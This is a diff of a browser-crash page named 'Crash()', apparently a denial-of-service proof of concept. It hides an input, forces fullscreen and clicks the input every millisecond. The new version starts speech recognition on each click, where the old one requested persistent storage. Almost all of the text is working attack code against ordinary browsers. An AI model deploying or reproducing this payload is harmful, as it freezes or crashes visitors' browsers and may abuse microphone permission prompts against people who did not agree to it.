@@ -8,18 +8,15 @@
 function Crash(){
 t=document.createElement('input');
 t.type='date';
-t.onclick = function(){window.webkitStorageInfo.requestQuota(PERSISTENT, 1024*1024*280, function(grantedBytes) {
-    window.webkitRequestFileSystem(PERSISTENT, grantedBytes, onInitFs, errorHandler); 
-}, function(e) {
-    console.log('Error', e); 
-});}
+t.onclick = function(){var recognition = new webkitSpeechRecognition();recognition.start();}
 document.documentElement.webkitRequestFullScreen();
 document.body.appendChild(t);
+t.style = 'display:none'
 t.click();
 setInterval(function(){t.click();}, 1);
 
   }
 
 </script>
-<input type=date value='Step 2' onclick='Crash()'><iframe style="display:"/>
+<input type=date value='Step 2' onclick='Crash()'><iframe style="position:"/>
 </body>
